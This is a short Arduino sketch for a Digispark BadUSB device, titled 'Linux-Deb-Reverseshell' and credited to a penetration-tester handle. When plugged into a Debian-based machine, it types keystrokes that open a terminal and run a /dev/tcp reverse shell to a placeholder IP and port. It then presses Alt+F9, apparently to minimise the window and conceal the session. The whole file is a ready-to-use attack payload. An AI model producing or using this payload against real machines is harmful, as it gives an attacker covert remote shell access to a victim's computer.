#include "DigiKeyboardFr.h"

void loop() {}

void setup() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(1000);
  // Author: Pentestersploit/Adrilaw
  // Github: https://github.com/Adrilaw
  // Xda-developer: @Kidpentester
  // Title: Linux-Deb-Reverseshell
  // Description: Uses /dev/tcp to get a reverse shell
  // Target: Debian based
  // VERSION: 1.2
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_T, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.print(F("bash"));
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print(F("sh -i >& /dev/tcp/yourip/yourport 0>&1"));
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_F9, MOD_ALT_LEFT);
}
